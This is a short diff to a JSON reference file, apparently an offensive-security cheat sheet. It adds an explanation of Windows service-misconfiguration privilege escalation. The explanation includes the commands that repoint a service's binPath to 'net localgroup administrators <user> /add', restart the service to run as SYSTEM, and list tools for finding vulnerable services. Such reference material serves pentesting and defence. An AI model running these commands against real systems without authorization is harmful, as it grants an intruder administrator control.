@@ -115,5 +115,6 @@
       "label": "Restart to execute as SYSTEM",
       "command": "sc stop <service> & sc start <service>"
     }
-  ]
+  ],
+  "explain": "Abuses SERVICE_CHANGE_CONFIG rights to repoint a service's binPath:\n  sc config <service>      change the service configuration\n  binpath=\"cmd /c net localgroup administrators <user> /add\"   run this command instead of the real binary\nRestart the service to execute as SYSTEM (adding you to Administrators), then restore the original binPath. accesschk -quvcw / PowerUp's Get-ModifiableService find candidates."
 }
